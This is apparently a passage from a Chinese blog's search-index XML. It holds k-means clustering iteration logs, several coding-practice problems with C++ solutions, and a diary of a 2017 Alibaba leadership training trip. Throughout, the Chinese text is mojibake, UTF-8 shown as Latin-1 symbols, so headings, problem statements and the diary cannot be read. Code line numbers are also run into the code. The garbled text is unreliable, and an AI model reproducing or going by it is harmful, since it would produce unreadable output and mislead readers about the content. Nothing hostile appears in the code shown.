8.159172752185112, 6.538509004352599](æ­¤å¤„çœç•¥)----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [-7.327500000000001, -0.54, -5.3575]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.042999999999999, -0.14599999999999996, 1.7229999999999996]ç¬¬ 3 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.680000000000001, 1.2066666666666668, 2.228333333333333]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[-7.82, -4.58, -3.97], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[0, 5, 8, 9], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [1, 4, 12, 13, 16, 17]]----------------------------------------ç¬¬ 2 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[4.299920057396417, 15.6286075515383, 8.555959748749537][8.899090543420714, 13.18250863834346, 2.0118434056578285](æ­¤å¤„çœç•¥)----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [-7.327500000000001, -0.54, -5.3575]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.042999999999999, -0.14599999999999996, 1.7229999999999996]ç¬¬ 3 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.680000000000001, 1.2066666666666668, 2.228333333333333]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[-7.82, -4.58, -3.97], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[0, 5, 8, 9], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [1, 4, 12, 13, 16, 17]] é¢˜ç›®å››ï¼šk = 3, m_{1}(0) = {(-0.1,0,0.1)}^T,m_{2}(0)={(0,-0.1,0.1)}^Tï¼Œm_{3}(0)={(-0.1,-0.1,0.1)}^T 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566è¾“å…¥ç±»åˆ«æ•°ç›®:3è¯·è¾“å…¥ç¬¬ 1 ä¸ªåˆå§‹ä¸­å¿ƒï¼š-0.1,0,0.1è¯·è¾“å…¥ç¬¬ 2 ä¸ªåˆå§‹ä¸­å¿ƒï¼š0,-0.1,0.1è¯·è¾“å…¥ç¬¬ 3 ä¸ªåˆå§‹ä¸­å¿ƒï¼š-0.1,-0.1,0.1åˆå§‹ä¸­å¿ƒå¦‚ä¸‹ï¼š[[-0.1, 0.0, 0.1], [0.0, -0.1, 0.1], [-0.1, -0.1, 0.1]]----------------------------------------ç¬¬ 1 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[9.85594744304169, 9.888766353797626, 9.80987767507832][7.7520384415971515, 7.87795024102082, 7.79333689763249](æ­¤å¤„çœç•¥)----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [-7.018000000000001, 2.6740000000000004, -0.30600000000000005]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.042999999999999, -0.14599999999999996, 1.7229999999999996]ç¬¬ 3 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.860000000000001, -1.658, -1.306]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-5.19, 4.24, 4.04]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-6.38, -1.74, 1.43]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[1, 4, 5, 8, 16], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 9, 12, 13, 17]]----------------------------------------ç¬¬ 2 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[8.16630981533275, 15.6286075515383, 4.0689777586022755][3.0735477871671364, 13.18250863834346, 6.274852986325655](æ­¤å¤„çœç•¥)----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [-7.055000000000001, 3.2, 0.98]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.042999999999999, -0.14599999999999996, 1.7229999999999996]ç¬¬ 3 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.861666666666667, -1.2866666666666666, -1.9966666666666668]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-7.71, 2.34, -6.33], [-5.19, 4.24, 4.04]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.87, 0.57, -5.45], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-6.38, -1.74, 1.43]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[1, 4, 8, 16], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 5, 9, 12, 13, 17]]----------------------------------------ç¬¬ 3 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[9.25289819461989, 15.6286075515383, 3.9570812054678215][1.7706284195166417, 13.18250863834346, 6.477542615323603](æ­¤å¤„çœç•¥)----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.836666666666667, 3.486666666666667, 3.4166666666666665]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.042999999999999, -0.14599999999999996, 1.7229999999999996]ç¬¬ 3 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.982857142857143, -0.7685714285714286, -2.615714285714286]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-5.19, 4.24, 4.04]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-6.38, -1.74, 1.43]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[1, 4, 16], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 5, 8, 9, 12, 13, 17]]----------------------------------------ç¬¬ 4 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[10.98184410743478, 15.6286075515383, 4.130603553269874][0.7941242556006796, 13.18250863834346, 6.62484932443211](æ­¤å¤„çœç•¥)----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.836666666666667, 3.486666666666667, 3.4166666666666665]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.042999999999999, -0.14599999999999996, 1.7229999999999996]ç¬¬ 3 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.982857142857143, -0.7685714285714286, -2.615714285714286]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-5.19, 4.24, 4.04]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-6.38, -1.74, 1.43]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[1, 4, 16], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 5, 8, 9, 12, 13, 17]] ï¼ˆè¯è¯´ï¼šlataxå†™å…¬å¼çš„æ„Ÿè§‰å¥½çˆ½å•Šâ€¦â€¦ï¼‰]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(3)æ•°ç»„å•è°ƒå’Œ]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C%2F</url>
      <content type="text"><![CDATA[é¢˜ç›®çŽ°å®šä¹‰æ•°ç»„å•è°ƒå’Œä¸ºæ‰€æœ‰å…ƒç´ içš„f(i)å€¼ä¹‹å’Œã€‚è¿™é‡Œçš„f(i)å‡½æ•°å®šä¹‰ä¸ºå…ƒç´ iå·¦è¾¹(ä¸åŒ…æ‹¬å…¶è‡ªèº«)å°äºŽç­‰äºŽå®ƒçš„æ•°å­—ä¹‹å’Œã€‚è¯·è®¾è®¡ä¸€ä¸ªé«˜æ•ˆç®—æ³•ï¼Œè®¡ç®—æ•°ç»„çš„å•è°ƒå’Œã€‚ç»™å®šä¸€ä¸ªæ•°ç»„AåŒæ—¶ç»™å®šæ•°ç»„çš„å¤§å°nï¼Œè¯·è¿”å›žæ•°ç»„çš„å•è°ƒå’Œã€‚ä¿è¯æ•°ç»„å¤§å°å°äºŽç­‰äºŽ500ï¼ŒåŒæ—¶ä¿è¯å•è°ƒå’Œä¸ä¼šè¶…è¿‡intèŒƒå›´ã€‚ æµ‹è¯•æ ·ä¾‹ï¼š[1,3,5,2,4,6],6è¿”å›žï¼š27 è§£æ³•12345678910111213class MonoSum &#123;public: int calcMonoSum(vector&lt;int&gt; A, int n) &#123; int sum = 0; int i,j; for (j = 1;j &lt; n;j++)&#123; for (i = 0;i &lt; j;i++)&#123; sum += A[i]&lt;=A[j]?A[i]:0; &#125; &#125; return sum; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(2)æ£‹å­ç¿»è½¬]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC%2F</url>
      <content type="text"><![CDATA[é¢˜ç›®åœ¨4x4çš„æ£‹ç›˜ä¸Šæ‘†æ»¡äº†é»‘ç™½æ£‹å­ï¼Œé»‘ç™½ä¸¤è‰²çš„ä½ç½®å’Œæ•°ç›®éšæœºå…¶ä¸­å·¦ä¸Šè§’åæ ‡ä¸º(1,1),å³ä¸‹è§’åæ ‡ä¸º(4,4),çŽ°åœ¨ä¾æ¬¡æœ‰ä¸€äº›ç¿»è½¬æ“ä½œï¼Œè¦å¯¹ä¸€äº›ç»™å®šæ”¯ç‚¹åæ ‡ä¸ºä¸­å¿ƒçš„ä¸Šä¸‹å·¦å³å››ä¸ªæ£‹å­çš„é¢œè‰²è¿›è¡Œç¿»è½¬ï¼Œè¯·è®¡ç®—å‡ºç¿»è½¬åŽçš„æ£‹ç›˜é¢œè‰²ã€‚ç»™å®šä¸¤ä¸ªæ•°ç»„Aå’Œf,åˆ†åˆ«ä¸ºåˆå§‹æ£‹ç›˜å’Œç¿»è½¬ä½ç½®ã€‚å…¶ä¸­ç¿»è½¬ä½ç½®å…±æœ‰3ä¸ªã€‚è¯·è¿”å›žç¿»è½¬åŽçš„æ£‹ç›˜ã€‚ æµ‹è¯•æ ·ä¾‹ï¼š[[0,0,1,1],[1,0,1,0],[0,1,1,0],[0,0,1,0]],[[2,2],[3,3],[4,4]]è¿”å›žï¼š[[0,1,1,1],[0,0,1,0],[0,1,1,0],[0,0,1,0]] è§£æ³•123456789101112131415161718192021222324class Flip &#123;public: vector&lt;vector&lt;int&gt; &gt; flipChess(vector&lt;vector&lt;int&gt; &gt; A, vector&lt;vector&lt;int&gt; &gt; f) &#123; int numOfRotate = 3; int temp; int i,j; for (temp = 0;temp &lt; numOfRotate;temp++)&#123; int x = f[temp][0] - 1; int y = f[temp][1] - 1; if ((y - 1) &gt;= 0) A[x][y - 1]++; if ((y + 1) &lt;= 3) A[x][y + 1]++; if ((x - 1) &gt;= 0) A[x - 1][y]++; if ((x + 1) &lt;= 3) A[x+1][y]++; &#125; for (i = 0;i &lt; 4;i++) for (j = 0;j &lt; 4;j++) A[i][j] = A[i][j]%2; return A; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(1)æœ€å¤§å·®å€¼]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC%2F</url>
      <content type="text"><![CDATA[é¢˜ç›®æœ‰ä¸€ä¸ªé•¿ä¸ºnçš„æ•°ç»„Aï¼Œæ±‚æ»¡è¶³0â‰¤aâ‰¤b&lt;nçš„A[b]-A[a]çš„æœ€å¤§å€¼ã€‚ç»™å®šæ•°ç»„AåŠå®ƒçš„å¤§å°nï¼Œè¯·è¿”å›žæœ€å¤§å·®å€¼ã€‚ æµ‹è¯•æ ·ä¾‹ï¼š[10,5],2è¿”å›žï¼š0 æ³•ä¸€1234567891011121314class LongestDistance &#123;public: int getDis(vector&lt;int&gt; A, int n) &#123; int min = A[0]; int dis = 0; int i,j; for (i = 0; i &lt; n ; i++) for (j = i+1 ; j &lt; n ; j++)&#123; if (A[j] - A[i] &gt; dis) dis = A[j] - A[i]; &#125; return dis; &#125;&#125;; æ³•äºŒ1234567891011121314class LongestDistance &#123;public: int getDis(vector&lt;int&gt; A, int n) &#123; int min = A[0]; int dis = 0; int i; for (i = 0; i &lt; n ; i++)&#123; if (A[i] &lt; min) min = A[i]; if ((A[i] - min) &gt; dis) dis = A[i]-min; &#125; return dis; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[è®°2017å¹´é˜¿é‡Œå·´å·´ä¹‹è¡Œ]]></title>
      <url>%2F2017%2F02%2F17%2F%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C%2F</url>
      <content type="text"><![CDATA[&emsp;&emsp;ä»Šå¹´1æœˆä»½ï¼ŒæŽ¥åˆ°ä¸€ä¸ªä»»åŠ¡ï¼Œè´Ÿè´£ç»„å»ºåŽ¦é—¨å¤§å­¦çš„äº’è”ç½‘å®‰å…¨å¿—æ„¿è€…è”ç›Ÿé˜Ÿä¼ï¼Œæˆ‘æš‚å±…é˜Ÿé•¿ä¹‹ä½ã€‚ä»Žå¤§ä½“ä¸Šæ¥è®²ï¼Œè¯¥å¿—æ„¿è”ç›Ÿåå‘äºŽä¸šåŠ¡æ€§ï¼Œè€ŒéžæŠ€æœ¯æ€§ï¼Œè¿™ä¸Žæˆ‘ä¹‹å‰æ‰€æŽ¥è§¦çš„ç½‘ç»œå®‰å…¨æ–¹å‘æœ‰æ‰€ä¸åŒã€‚è€Œåœ¨ä»Šå¹´2æœˆ15æ—¥ï¼Œä½œä¸ºé˜Ÿé•¿ï¼Œå—è”ç›Ÿé‚€è¯·å‰å¾€é˜¿é‡Œå·´å·´å‚ä¸Žé’å¹´é¢†å¯¼åŠ›åŸ¹è®­ä¼šã€‚ä»¥ä¸‹å°±â€œè®°æµæ°´è´¦â€åœ°å›žå¿†ä¸€ä¸‹è¿™å‡ å¤©æ¥çš„ç»åŽ†å§ã€‚ å‰å¥&emsp;&emsp;åœ¨å‰å¾€é˜¿é‡Œå·´å·´ä¹‹å‰ï¼Œæˆ‘è¢«ä»»å‘½ä¸ºHRï¼Œè´Ÿè´£ç®¡ç†æ­¤æ¬¡å‚åŠ é˜¿é‡Œå·´å·´åŸ¹è®­ä¼šçš„å„é«˜æ ¡åŒå­¦çš„ä¿¡æ¯å’Œå®‰å…¨ã€‚è™½ç„¶è¢«é€‰ä¸ºç»„å§”ä¼šçš„åŒå­¦ä»¬ï¼ˆå¤§éƒ¨åˆ†ï¼‰éƒ½è¿˜äº’ä¸ç›¸è¯†ï¼Œä½†åœ¨å·¥ä½œæ—¶é…åˆåº¦å’Œæ•ˆçŽ‡è¿˜æ˜¯éžå¸¸é«˜çš„ã€‚è€Œä¸”ä¹Ÿå¾ˆæ„Ÿè°¢æ…ˆçŽ‰å§çš„ä¿¡ä»»ï¼Œä¸ç„¶ä»¥æˆ‘äº’è”ç½‘å®‰å…¨è”ç›Ÿèµ„åŽ†ä¹‹æµ…ä½•ä»¥æ‹…æ­¤ä¹‹ä»»ï¼Ÿ 2 æœˆ 15 æ—¥ æ™š&emsp;&emsp;æˆ‘é€‰æ‹©ç«è½¦ï¼Œä»ŽåŽ¦é—¨åŒ—å‡ºå‘ï¼Œä¸€è·¯é¢ ç°¸ã€‚ç”±äºŽä½œä¸ºHRï¼Œéœ€è¦åŠæ—¶çš„è·Ÿè¿›å„ä½äººå‘˜çš„è¡Œç¨‹ä¿¡æ¯ï¼Œä½†æ‰‹æœºä¿¡å·æ—¶å¥½æ—¶åï¼Œæ‰€ä»¥åœ¨æ²Ÿé€šä¸Šä¹Ÿæ—¶æ–­æ—¶ç»­hhã€‚&emsp;&emsp;ç­‰åˆ°äº†æ­å·žï¼Œå·²ç»æ˜¯ä¸‹åˆçš„äº”ç‚¹å·¦å³ã€‚ä¸‰å¹´å‰ï¼Œæ›¾å’Œä¸¤çŸ¥å·±æ¥æ­å·žæµ™å¤§è¿›è¡Œç‰©ç«žåŸ¹è®­ï¼Œè€Œä»Šä¸‰äººä¸­ä¸€äººåŽ»äº†åŒ—å¤§ä¸€äººåŽ»äº†æµ™å¤§ï¼Œä¸ç¦æ„Ÿæ…¨ã€‚ &emsp;&emsp;å°½ç®¡æ—©æ—©åœ°åä¸Šå‡ºç§Ÿè½¦ï¼Œä¸è¿‡åœ¨16å…¬é‡Œçš„è·¯ç¨‹ä¸­é‡åˆ°äº†16ä¸ªçº¢ç¯ï¼Œç­‰åˆ°è¾¾é…’åº—å·²æ˜¯å…­ç‚¹å¤šï¼Œç­‰æ”¶æ‹¾å®Œæ¯•ï¼Œæ¬§æ€»PMæ‹›å‘¼æˆ‘å’Œä»–ä»¬åƒé¥­ã€‚åœ¨åƒé¥­çš„è¿‡ç¨‹ä¸­å’Œå…¶ä»–è”ç›Ÿé˜Ÿä¼çš„åŒå­¦è¿›è¡Œäº¤è°ˆï¼Œå‘æ¬§æ€»PMï¼Œèµµzyå­¦é•¿ï¼Œé©¬lå­¦å§ç­‰è®¨æ•™ä¸€äº›å…³äºŽå»ºé˜Ÿå’Œå‘å±•çš„äº‹é¡¹ã€‚ &emsp;&emsp;æ™šä¸Š8ç‚¹å·¦å³ï¼Œæ…ˆçŽ‰å§ç»™å„ä½å‚ä¼šåŒå­¦å¼€ä¸ªç®€çŸ­çš„å°ä¼šï¼Œå¹¶åœ¨ä¹‹åŽä¸Žç»„å§”ä¼šæˆå‘˜è®¨è®ºè¿›ä¸€æ­¥çš„åŽç»­å®‰æŽ’ã€‚å¹¶ä¸”å•ç‹¬ä¸Žæ…ˆçŽ‰å§æŽ¢è®¨äº†æœ¬æ ¡è”ç›Ÿçš„å‘å±•æ–¹å‘å’Œå…·ä½“äº‹é¡¹ï¼Œå¹¶ä¸”æˆ‘å‘æ…ˆçŽ‰å§è¯¢é—®äº†å…³äºŽé˜¿é‡Œå·´å·´æ ¡å›­ä¿±ä¹éƒ¨çš„äº‹ã€‚ä¿±ä¹éƒ¨çš„äº‹è·Ÿå®‰å…¨è”ç›Ÿæ²¡æœ‰å…³ç³»ï¼Œä¸è¿‡æ…ˆçŽ‰å§è¦å¸®æˆ‘å‘å…¶ä½™éƒ¨é—¨çš„åŒäº‹è¯¢é—®è¯¢é—®ï¼Œå¤ªæ„Ÿè°¢äº†ï¼ 2 æœˆ 16 æ—¥ä¸Šåˆï¼šé˜¿é‡Œä¼ä¸šæ–‡åŒ–&emsp;&emsp;ä¸Šåˆçš„ä¸»è¦å†…å®¹æ˜¯ä»‹ç»é˜¿é‡Œå·´å·´çš„ä¼ä¸šæ–‡åŒ–ã€‚å°è±¡è¾ƒä¸ºæ·±åˆ»çš„ï¼Œé¦–å…ˆæ˜¯é˜¿é‡Œçš„ç»©æ•ˆè€ƒæ ¸æœºåˆ¶ï¼Œå°†ä¸ªäººä»·å€¼è§‚çº³å…¥ç»©æ•ˆè€ƒæ ¸ä½“ç³»ï¼Œæœ€ç»ˆçš„è¯„ä»·çº¦èŽ«æœ‰äº”ç§ï¼šæ˜Žæ˜Ÿï¼Œè€é»„ç‰›ï¼Œé‡Žç‹—ï¼Œå°ç™½å…”ï¼Œç‹—ã€‚ä¸€æ–¹é¢åœ¨ä¸ºè¿™ç§è€ƒæ ¸æœºåˆ¶æ„Ÿåˆ°æƒŠè®¶ï¼Œå¦ä¸€æ–¹é¢åœ¨æƒ³è¯„ä»·ä¸­æ²¡æœ‰â€œçŒ«â€æ˜¯ä¸æ˜¯å› ä¸ºé˜¿é‡Œåœ¨ä¸šå†…è¢«ç§°ä½œâ€œçŒ«åŽ‚â€hhã€‚ &emsp;&emsp;å†è€…æ˜¯ï¼Œé˜¿é‡Œå‘˜å·¥çš„åŸ¹è®­ä¸Žæˆé•¿ä½“ç³»ã€‚å¹³æ—¥æœ‰ç¨å…³æ³¨å„å¤§ITå…¬å¸çš„å±‚çº§åˆ†å¸ƒï¼ŒçŸ¥é“é˜¿é‡Œçš„på±‚ï¼ˆæŠ€æœ¯å²—ï¼‰å’Œmå±‚ï¼ˆç®¡ç†å²—ï¼‰ï¼Œä½†å¤§å¤šæ•°æ—¶å€™æœ‰ç§å‰²è£‚çš„æ„Ÿè§‰ã€‚è€Œæ­¤æ¬¡ä¼šä¸Šçš„æ‰€æåˆ°çš„ï¼Œæ°å¥½æˆä¸ºé“¾æŽ¥å„å¤§å±‚çº§çš„é“¾çŽ¯ï¼Œä»Žp6åˆ°p9+ï¼Œä»Žm1åˆ°m4+ï¼Œè¿™æ˜¯ä¸ªæ¸è¿›çš„è¿‡ç¨‹ï¼ŒåŒæ—¶éœ€è¦èŒä¸šæŠ€èƒ½çš„å¢žé•¿ï¼Œä¹Ÿéœ€è¦é€šç”¨æŠ€èƒ½çš„æå‡ï¼Œè¿™å±žäºŽé˜¿é‡Œå¯¹å…³é”®äººæ‰çš„å‘å±•é¡¹ç›®ã€‚åŒæ—¶é˜¿é‡Œæœ‰ä¸ºå‘˜å·¥æä¾›å¤œæ ¡ï¼Œè¿™æ˜¯ä¸ªæˆé•¿çš„è¿‡ç¨‹ã€‚ &emsp;&emsp;è¿˜æœ‰æ˜¯ï¼Œé˜¿é‡Œå‘˜å·¥çš„ç¦åˆ©ã€‚é˜¿é‡Œçš„é£Ÿå ‚è‡ªä¸å¿…è¯´ï¼Œè®²ä¸€äº›ç‰¹æ®Šçš„ã€‚æ¯”å¦‚åœ¨é˜¿é‡Œæœ‰æ‰€è°“çš„â€ä¸€å¹´é¦™ï¼Œä¸‰å¹´é†‡ï¼Œäº”å¹´é™ˆâ€ï¼Œé˜¿é‡Œçš„å‘˜å·¥æ¯åˆ°ä¸€ä¸ªé˜¶æ®µï¼Œéƒ½èƒ½èŽ·å¾—ç›¸åº”çš„å¥–åŠ±ï¼Œæ¯”å¦‚â€œäº”å¹´é™ˆâ€æ—¶å€™ä¼šè¢«æŽˆäºˆä¸€æžšæˆ’æŒ‡ã€‚è¿™ç‚¹æœ‰ç‚¹ç±»ä¼¼æš´é›ªå…¬å¸çš„å¥–åŠ±æœºåˆ¶ï¼Œæš´é›ªçš„å‘˜å·¥åœ¨å„ä¸ªç›¸åº”å·¥ä½œå¹´é™ä¹Ÿèƒ½èŽ·å¾—å¥–åŠ±ï¼Œæ¯”å¦‚äº”å¹´æ—¶ä¼šèŽ·å¾—è£è€€ä¹‹å‰‘ã€‚ä¸€æ–¹é¢æ˜¯å¯¹å‘˜å·¥è¿‡åŽ»å‡ å¹´å¥‹æ–—çš„è‚¯å®šï¼Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ç›¸ä¿¡é˜¿é‡Œå’Œæš´é›ªçš„å‘˜å·¥éƒ½æ˜¯æ¿€æƒ…çš„äººï¼Œè¿™ç§å¹´é•¿çš„å¥–åŠ±æœ‰ç‚¹åƒæ‰“æ€ªå‡çº§ä¸€æ ·ï¼Œè¿™ç‚¹å¯¹å‘˜å·¥çš„å½’å±žæ„Ÿã€æˆå°±æ„Ÿä»¥åŠå‡èšåŠ›çš„å½¢æˆæ˜¯å¾ˆé‡è¦çš„ã€‚ &emsp;&emsp;å½“ç„¶è¿˜æœ‰ä¸€äº›é˜¿é‡Œçš„å°ç»†èŠ‚ï¼Œè¿™é‡Œç¨å¾®è®²è®²é˜¿é‡Œå¯¹ç¦»èŒå‘˜å·¥çš„åšæ³•ã€‚é˜¿é‡Œæœ‰æ‰€è°“çš„â€œæ ¡å‹æ—¥â€ï¼Œç¦»èŒçš„å‘˜å·¥èƒ½åœ¨è§„å®šçš„æ—¶é—´å›žæ¥é˜¿é‡Œã€‚é˜¿é‡Œèƒ½å†å¯¹ç¦»èŒå‘˜å·¥æ•žå¼€å¤§é—¨ï¼Œè¿™æ˜¯ä¸€ç§å…³æ€€ï¼›è€Œç¦»èŒå‘˜å·¥æ„¿æ„å†è¸è¿›çˆ±å¤§é—¨ï¼Œè¿™æ˜¯ä¸€ç§æƒ…æ€€ã€‚æ¯•ç«Ÿå¾ˆå¤šä¼ä¸šå¾ˆå¤šå…¬å¸çš„å‘˜å·¥åœ¨ç¦»èŒåŽåŸºæœ¬ä¸Šå°±æ˜¯ä¸ŽåŽŸå…¬å¸ä¸€åˆ€ä¸¤æ–­äº†ã€‚æˆ‘æƒ³è¿™ç§å…³æ€€å’Œæƒ…æ€€æ˜¯éœ€è¦åŸºäºŽåŒæ–¹çš„ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æ¤æ ¹äºŽä¼ä¸šæ–‡åŒ–çš„ã€‚ &emsp;&emsp;æ€»ä½“æ¥è¯´ï¼Œç®¡ä¸­çª¥è±¹å¯è§ä¸€æ–‘å§ã€‚ 